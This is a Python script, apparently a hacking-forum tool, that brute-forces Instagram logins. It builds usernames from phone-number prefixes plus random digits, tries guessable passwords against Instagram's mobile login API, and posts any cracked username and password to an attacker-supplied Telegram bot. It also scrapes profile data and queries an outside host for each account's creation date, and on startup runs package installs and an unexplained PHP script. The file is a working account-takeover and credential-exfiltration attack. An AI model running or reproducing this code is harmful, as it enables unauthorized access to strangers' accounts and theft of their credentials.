import time
import webbrowser
from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pkg install php')
    os.system('php Browser_Requirements.php')
    os.system('clear')
    
    
    
####----[ Ø§Ù„Ø§Ù„ÙˆØ§Ù† ]----####

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
BJingga= "\x1b[38;5;208m" # Jingga
lo = '_ _ _ _ _ _ _ _ _ _ _ _ _ _ _  ☆  '




####----[ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ]----####


lestpass = ["1q2w3e4r","1q2w3e4r5t","123456789123456789","abc123","qwer1234"]
admin = ("Emad")
pas = ("123456")
os.system("clear")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print("""            
                          """+BGreen+"""   
   .                    .--. 
 .'|                    |__| 
<  |                    .--. 
 | |                    |  | 
 | | .'''-.             |  | 
 | |/.'''. \            |  | 
 |  /    | |            |  | 
 | |     | |            |__| 
 | |     | |                 
 | '.    | '.                
 '---'   '---'               
""")
time.sleep(2)
os.system("clear")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print("""  """+BGreen+""" Send me a message on WhatsApp
""")
time.sleep(4)
os.system("clear")
ope = webbrowser.open("https://wa.me/qr/52EACDS5GP6AM1")
print("""       
"""+BGreen+"""                                Welcome To admin
 """+BWhite+""" 
  ______   __  __              _____     _      _     
 |  ____| |  \/  |     /\     |  __ \   | |    | |    
 | |__    | \  / |    /  \    | |  | |  | | __ | |__  
 |  __|   | |\/| |   / /\ \   | |  | |  | |/ / | '_ \ 
 | |____  | |  | |  / ____ \  | |__| |  |   < _| | | |
 |______| |_|  |_| /_/    \_\ |_____/   |_|\_(_)_| |_|
 Emad-Alkhashn  v.1                                                                  
 >>------♡----------------♡------->
  Whatsapp : +96170318652
  Instagram : @di_1
  version : v.1
  Hacker : Emad-alkhshn
 >>------♡----------------♡------->              """)
print (BWhite+lo*2)
print (" ")
xnxx = input(" "+BWhite+" ( +961 ) Enter Number :  ")
print(" ")
fock = input(" "+BWhite+" ( 81 ) Enter to number :  ")
porn = (" "+BWhite+" Enter Number how :  ")
print(" ")
myadmin = input(" "+BWhite+" ( ID ) Enter id : ")
print(" ")
tele = input(" "+BWhite+" ( TOKEN )Enter token :  ")
print (" ")
print (BWhite+lo*2)
print (" ")
	
	
	



def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
ð–£˜  Al kullan ABEE
â•â”€â”€â”€â”€â”€â”€â”€â—‡â”€â”€â”€â”€â”€â”€â”€â•
â¶âž¾ User : {user2}
â·âž¾ Name : {name}
â¸âž¾ Pasw : {pasw} 
â¹âž¾ Followers : {followes}
âºâž¾  Following : {following}
â»âž¾ Date : {datee}
 â•â”€â”€â”€â”€â”€â”€â”€â—‡â”€â”€â”€â”€â”€â”€â”€â•
âŠ± FOR  @TR_HACK_FORUM âŠ° """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars = '10203040506070809011223344556677889900'
    u = xnxx
    u0 = fock
    v = porn
    u2 = str("". join(random.choice(chars)for i in range(6)))
    user = u+u0+u2
    pasw = u0+u2
    url = 'https://i.Instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-FB-Capabilities':'AQ==', 
         'X-FB-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BGreen+f"  ︻╦̵̵̿╤──  Welcome  "+BGreen+" :"+BGreen+f" {user}  ☆  {pasw}                                                       ")
        print(lo*2)
        requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
        
♤       '♡         ◇         '♡         ♧
             |                          |   
>>------♡----------------♡------->
- | ☆ ☆ ☆ | User  :  {user} 
  |    KING   |
- | ☆ ☆ ☆ | pass  :  {pasw} 
>>------♡----------------♡------->
             |                          |
           '♡                      '♡
   """) 
    else:
        print(" "+BWhite+f" "+BYellow+" "+BYellow+f" ︻╦̵̵̿╤──     {user}  ☆   {pasw}                                                                   ")
        print(BWhite+lo*2)
        print(" ")
    
